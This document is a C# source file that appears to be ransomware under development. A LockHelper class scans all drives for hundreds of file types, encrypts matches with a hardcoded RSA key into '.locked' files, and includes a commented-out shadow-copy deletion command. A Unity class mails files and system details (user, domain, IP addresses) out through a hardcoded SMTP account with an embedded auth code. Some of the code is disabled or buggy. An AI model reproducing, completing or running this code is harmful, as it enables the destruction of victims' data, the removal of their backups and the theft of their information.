using Microsoft.VisualBasic.Devices;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Net.Mime;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;

namespace MyApplic
{
    public class LockHelper
    {

        Logger _log = Logger.GetLogger("LockHelper");
        volatile Queue<string> _lock_files = new Queue<string>();
        List<string> validextension = new List<string>();
        const string PublicKey = @"<RSAKeyValue><Modulus>nwbjN1znmyL2KyOIrRy/PbWZpTi+oekJIoGNc6jHCl0JNZLFHNs70fyf7y44BH8L8MBkSm5sSwCZfLm5nAsDNOmuEV5Uab5DuWYSE4R2Z3NkKexJJ4bnmXEZYXPMzTbXIpyvU2y9YVrz1BjjRPeHsb6daVdrBgjs4+2b/ok9myM=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";

        void Init()
        {
            validextension.AddRange(new[] { ".gif", ".apk", ".groups", ".hdd", ".hpp", ".log", ".m2ts", ".m4p", ".mkv", ".mpeg" });
            validextension.AddRange(new[] { ".epub", ".yuv", ".ndf", ".nvram", ".ogg", ".ost", ".pab", ".pdb", ".pif", ".png" });
            validextension.AddRange(new[] { ".qed", ".qcow", ".otp", ".s3db", ".qcow2", ".rvt", ".st7", ".stm", ".vbox", ".vdi" });
            validextension.AddRange(new[] { ".vhd", ".vhdx", ".vmdk", ".vmsd", ".psafe3", ".vmx", ".vmxf", ".3fr", ".3pr", ".ab4" });
            validextension.AddRange(new[] { ".accde", ".accdr", ".accdt", ".ach", ".acr", ".sd0", ".sxw", ".adb", ".advertisements" });
            validextension.AddRange(new[] { ".agdl", ".ait", ".apj", ".asm", ".awg", ".back", ".backup", ".sti", ".oil", ".backupdb" });
            validextension.AddRange(new[] { ".bay", ".bdb", ".bgt", ".bik", ".bpw", ".cdr3", ".cdr4", ".cdr5", ".cdr6", ".ycbcra" });
            validextension.AddRange(new[] { ".cdrw", ".ce1", ".ce2", ".cib", ".craw", ".crw", ".csh", ".csl", ".db_journal", ".dc2" });
            validextension.AddRange(new[] { ".pptm", ".dcs", ".ddoc", ".ddrw", ".der", ".des", ".dgc", ".djvu", ".dng", ".drf" });
            validextension.AddRange(new[] { ".dxg", ".eml", ".ppt", ".erbsql", ".erf", ".exf", ".ffd", ".fh", ".fhd", ".flp" });
            validextension.AddRange(new[] { ".gray", ".grey", ".gry", ".hbk", ".ibd", ".7z", ".ibz", ".iiq", ".incpas", ".jpe" });
            validextension.AddRange(new[] { ".kc2", ".kdbx", ".kdc", ".kpdx", ".ldf", ".lua", ".mdc", ".mdf", ".mef", ".config" });
            validextension.AddRange(new[] { ".mfw", ".mmw", ".mny", ".mrw", ".myd", ".ndd", ".nef", ".nk2", ".nop", ".nrw", ".ns2" });
            validextension.AddRange(new[] { ".ns3", ".ldf", ".ns4", ".nwb", ".nx2", ".nxl", ".nyf", ".odb", ".odf", ".odg", ".odm" });
            validextension.AddRange(new[] { ".orf", ".otg", ".oth", ".py", ".ots", ".ott", ".p12", ".p7b", ".p7c", ".pdd", ".pem" });
            validextension.AddRange(new[] { ".plus_muhd", ".plc", ".pot", ".pptx", ".py", ".qba", ".qbr", ".qbw", ".qbx", ".qby" });
            validextension.AddRange(new[] { ".raf", ".rat", ".raw", ".rdb", ".rwl", ".rwz", ".conf", ".sda", ".sdf", ".sqlite" });
            validextension.AddRange(new[] { ".sqlite3", ".sqlitedb", ".sr2", ".srf", ".srw", ".st5", ".st8", ".std", ".stx", ".sxd" });
            validextension.AddRange(new[] { ".sxg", ".sxi", ".sxm", ".tex", ".wallet", ".wb2", ".wpd", ".x11", ".x3f", ".xis", ".ARC" });
            validextension.AddRange(new[] { ".contact", ".dbx", ".doc", ".docx", ".jnt", ".jpg", ".msg", ".oab", ".ods", ".pdf", ".pps" });
            validextension.AddRange(new[] { ".ppsm", ".prf", ".pst", ".rar", ".rtf", ".txt", ".wab", ".xls", ".xlsx", ".xml", ".zip" });
            validextension.AddRange(new[] { ".1cd", ".3ds", ".3g2", ".7zip", ".accdb", ".aoi", ".asf", ".asp", ".aspx", ".asx", ".avi" });
            validextension.AddRange(new[] { ".bak", ".cer", ".cfg", ".class", ".cs ", ".css", ".csv", ".db", ".dds", ".dwg", ".dxf" });
            validextension.AddRange(new[] { ".flf", ".flv", ".html", ".idx", ".js", ".key", ".kwm", ".laccdb", ".lit", ".m3u", ".mbx" });
            validextension.AddRange(new[] { ".md", ".mdf", ".mid", ".mlb", ".mov", ".mp3", ".mp4", ".mpg", ".obj", ".odt", ".pages" });
            validextension.AddRange(new[] { ".php", ".psd", ".pwm", ".rm", ".safe", ".sav", ".save", ".sql", ".srt", ".swf", ".thm" });
            validextension.AddRange(new[] { ".vob", ".wav", ".wma", ".wmv", ".xlsb", ".3dm", ".aac", ".ai", ".arw", ".c", ".cdr" });
            validextension.AddRange(new[] { ".cls", ".cpi", ".cpp", ".cs", ".db3", ".docm", ".dot", ".dotm", ".dotx", ".drw", ".dxb" });
            validextension.AddRange(new[] { ".eps", ".fla", ".flac", ".fxg", ".java", ".m", ".m4v", ".max", ".mdb", ".pcd", ".pct" });
            validextension.AddRange(new[] { ".pl", ".potm", ".potx", ".ppam", ".ppsm", ".ppsx", ".pptm", ".ps", ".r3d", ".rw2", ".sldm" });
            validextension.AddRange(new[] { ".sldx", ".svg", ".tga", ".wps", ".xla", ".xlam", ".xlm", ".xlr", ".xlsm", ".xlt", ".xltm" });
            validextension.AddRange(new[] { ".xltx", ".xlw", ".act", ".adp", ".al", ".dip", ".docb", ".frm", ".gpg", ".jsp", ".lay" });
            validextension.AddRange(new[] { ".lay6", ".m4u", ".mml", ".myi", ".onetoc2", ".PAQ", ".ps1", ".sch", ".slk", ".snt", ".suo" });
            validextension.AddRange(new[] { ".tgz", ".tif", ".tiff", ".txt", ".uop", ".uot", ".vcd", ".wk1", ".wks", ".xlc" });
        }

        IEnumerable<DirectoryInfo> GetDirectories(DirectoryInfo parentDirectory)
        {
            DirectoryInfo[] childDirectories = null;
            try
            {
                childDirectories = parentDirectory.GetDirectories();
            }
            catch (Exception)
            {

            }
            yield return parentDirectory;
            if (childDirectories != null)
            {
                foreach (var childDirectory in childDirectories)
                {
                    var childDirectories2 = GetDirectories(childDirectory);
                    foreach (var childDirectory2 in childDirectories2)
                    {
                        yield return childDirectory2;
                    }
                }
            }
        }

        IEnumerable<FileInfo> GetFiles(DirectoryInfo parentDirectory,
                                             string searchPattern)
        {
            var directories = GetDirectories(parentDirectory);
            foreach (var directory in directories)
            {
                FileInfo[] files = null;
                try
                {
                    files = directory.GetFiles(searchPattern);
                    if (files.Length == 0)
                        break;
                }
                catch (Exception)
                {

                }
                if (files != null)
                {
                    foreach (var file in files)
                    {
                        yield return file;
                    }
                }
            }
        }

        void RunEncrypt()
        {
            var macname = Environment.MachineName;
            while (true)
            {
                if (_lock_files.Count > 0)
                {
                    var file = _lock_files.Dequeue();
                    var rsa = new RSACryptoServiceProvider(1024);
                    var fs = new FileStream(file, FileMode.Open, FileAccess.Read, FileShare.Read);
                    var fsout = new FileStream(file + $"_{DateTime.Now.ToString("yyyyMMdd")}_.locked", FileMode.Open, FileAccess.Read, FileShare.Read);
                    var bys = new byte[fs.Length];
                    fs.Read(bys, 0, bys.Length);
                    rsa.FromXmlString(PublicKey);
                    byte[] buf = rsa.Encrypt(bys, false);
                    fsout.Write(buf, 0, buf.Length);
                    fsout.Flush();
                    fsout.Close();
                }
            }
        }

        void SearchDisk()
        {
            var dris = Directory.GetLogicalDrives();
            for (int i = 0; i < dris.Length; i++)
            {
                SearchFiles(dris[i]);
            }
        }

        void Rename(string filename)
        {
            var newname = Guid.NewGuid().ToString().Replace("-", "");
            _log.Info(newname + "------>" + filename);
            Computer MyComputer = new Computer();
            MyComputer.FileSystem.RenameFile(filename, newname);
        }

        void SearchFiles(string path)
        {
            var files = GetFiles(new DirectoryInfo(path), "*.*");
            var files1 = files.GetEnumerator();
            while (files1.MoveNext())
            {
                var f = (FileInfo)files1.Current;
                if (validextension.IndexOf(f.Extension) >= 0)
                    _lock_files.Enqueue(f.FullName);
                var filehashcode = $"{Path.GetFileName(f.FullName) } MD5 Hash:" + MD5Hash(f.FullName);
                Console.WriteLine(filehashcode);
                _log.Info(filehashcode);
            }
        }

        string MD5Hash(string file)
        {
            try
            {
                if (!Path.HasExtension(file))
                    return "";
                var md5 = MD5.Create();
                // hash path
                string relativePath = file.Substring("\\".Length + 1);
                byte[] pathBytes = Encoding.UTF8.GetBytes(relativePath.ToLower());
                md5.TransformBlock(pathBytes, 0, pathBytes.Length, pathBytes, 0);

                using (var fs = new FileStream(file, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
                {
                    var contentBytes = new byte[fs.Length];
                    fs.Read(contentBytes, 0, contentBytes.Length);
                    md5.TransformBlock(contentBytes, 0, contentBytes.Length, contentBytes, 0);
                    md5.TransformFinalBlock(contentBytes, 0, contentBytes.Length);
                }
                return BitConverter.ToString(md5.Hash).Replace("-", "").ToLower();
            }
            catch
            {
                return "";
            }
        }

        void RemoveBackup()
        {
            //try
            //{
            //    ProcessStartInfo info = new ProcessStartInfo("cmd.exe", "/c vssadmin.exe delete shadows /all /quiet");
            //    info.RedirectStandardOutput = true;
            //    info.UseShellExecute = false;
            //    info.CreateNoWindow = true;
            //    info.WindowStyle = ProcessWindowStyle.Hidden;
            //    Process process = new Process();
            //    process.StartInfo = info;
            //    process.Start();
            //}
            //catch (Exception)
            //{

            //}
        }

        void DisplayLockinfo()
        {
            Console.WriteLine("run done...");
        }

        public void Main()
        {
            Init();
            //RunEncrypt();
            SearchDisk();
            //RemoveBackup();
            //DisplayLockinfo();
        }
    }

    public class Unity
    {
        static SmtpClient smtpClient;
        const string from_emailname = "lockyour@yeah.net";
        const string to_emailname = "lockyour@yeah.net";
        const string authcode = "HKPSKRFRCFMQEMDR";
        const string ip_url = "http://www.net.cn/static/customercare/yourip.asp";

        static Attachment AddFile(string file)
        {
            Attachment data = new Attachment(file, MediaTypeNames.Application.Octet);
            // Add time stamp information for the file.
            ContentDisposition disposition = data.ContentDisposition;
            disposition.CreationDate = System.IO.File.GetCreationTime(file);
            disposition.ModificationDate = System.IO.File.GetLastWriteTime(file);
            disposition.ReadDate = System.IO.File.GetLastAccessTime(file);
            // Add the file attachment to this e-mail message.
            return data;
        }

        public static void Push(string file)
        {
            ThreadStart start = () =>
            {
                try
                {
                    //实例化一个发送邮件类。
                    var mailMessage = new MailMessage();

                    //发件人邮箱地址，方法重载不同，可以根据需求自行选择。
                    mailMessage.From = new MailAddress(from_emailname, "displayName", Encoding.GetEncoding("GB2312"));
                    //收件人邮箱地址。
                    mailMessage.To.Add(new MailAddress(to_emailname, "displayName", Encoding.GetEncoding("GB2312")));

                    //邮件标题。
                    mailMessage.SubjectEncoding = Encoding.GetEncoding("GB2312");
                    mailMessage.BodyEncoding = Encoding.GetEncoding("GB2312");
                    mailMessage.Subject = "displayName";

                    //邮件内容。
                    var info = GetSystemInfo();
                    mailMessage.Body = info;
                    mailMessage.Attachments.Add(AddFile(file));
                    //实例化一个SmtpClient类。
                    if (smtpClient == null)
                        smtpClient = new SmtpClient();
                    //在这里我使用的是qq邮箱，所以是smtp.qq.com，如果你使用的是126邮箱，那么就是smtp.126.com。
                    smtpClient.Host = "smtp.163.com";
                    //使用安全加密连接。
                    smtpClient.EnableSsl = true;
                    //不和请求一块发送。
                    smtpClient.UseDefaultCredentials = false;
                    //验证发件人身份(发件人的邮箱，邮箱里的生成授权码);
                    smtpClient.Credentials = new NetworkCredential(from_emailname, authcode);
                    //发送
                    smtpClient.Send(mailMessage);
                }
                catch { }
                finally { }
            };
            var thread = new Thread(start);
            thread.IsBackground = true;
            thread.Start();
        }

        private static string GetSystemInfo()
        {
            var info = new StringBuilder();
            info.Append(Environment.NewLine);
            info.Append($"machineName: { Environment.MachineName}" + Environment.NewLine);
            info.Append($"platform :{ Environment.OSVersion.Platform}" + Environment.NewLine);
            info.Append($"osversion.Version: {Environment.OSVersion.VersionString}" + Environment.NewLine);
            info.Append($"processorCount: {Environment.ProcessorCount}" + Environment.NewLine);
            info.Append($"servicePack: {Environment.OSVersion.ServicePack}" + Environment.NewLine);
            info.Append($"userName :{ Environment.UserName}" + Environment.NewLine);
            info.Append($"domainName: { Environment.UserDomainName}" + Environment.NewLine);
            info.Append($"systemDirectory: { Environment.SystemDirectory}" + Environment.NewLine);
            info.Append($"currentDirectory: { Environment.CurrentDirectory}" + Environment.NewLine);
            info.Append($"workingMemory: { GetMemory()}" + Environment.NewLine);
            info.Append($"Public_IP: { GetIP()}" + Environment.NewLine);
            info.Append($"Host_IP: { GetHostIP()}" + Environment.NewLine);
            return info.ToString();
        }

        public static string GetMemory()
        {
            Process proc = Process.GetCurrentProcess();
            long b = proc.PrivateMemorySize64;
            for (int i = 0; i < 2; i++)
            {
                b /= 1024;
            }
            return b + "MB";
        }

        private static string GetHtml()
        {
            string pageHtml = string.Empty;
            try
            {
                using (WebClient MyWebClient = new WebClient())
                {
                    Encoding encode = Encoding.GetEncoding("gbk");
                    MyWebClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.84 Safari/537.36");
                    MyWebClient.Credentials = CredentialCache.DefaultCredentials;//获取或设置用于向Internet资源的请求进行身份验证的网络凭据
                    var pageData = MyWebClient.DownloadData(ip_url); //从指定网站下载数据
                    pageHtml = encode.GetString(pageData);
                }
            }
            catch
            {

            }
            finally { }

            return pageHtml;
        }

        /// <summary>
        /// 从html中通过正则找到ip信息(只支持ipv4地址)
        /// </summary>
        /// <param name="pageHtml"></param>
        /// <returns></returns>
        public static string GetIP(string pageHtml = null)
        {
            pageHtml = pageHtml ?? GetHtml();
            //验证ipv4地址
            string reg = @"(?:(?:(25[0-5])|(2[0-4]\d)|((1\d{2})|([1-9]?\d)))\.){3}(?:(25[0-5])|(2[0-4]\d)|((1\d{2})|([1-9]?\d)))";
            string ip = "";
            var m = Regex.Match(pageHtml, reg);
            if (m.Success)
                ip = m.Value;
            return ip;
        }

        static string GetHostIP()
        {
            var addresses = Dns.GetHostAddresses(Dns.GetHostName());
            StringBuilder builder = new StringBuilder();
            for (int i = 0; i < addresses.Length; i++)
            {
                if (addresses[i].AddressFamily.ToString() == "InterNetwork")
                    builder.AppendLine(addresses[i].ToString());
            }
            return builder.ToString();
        }
    }
}
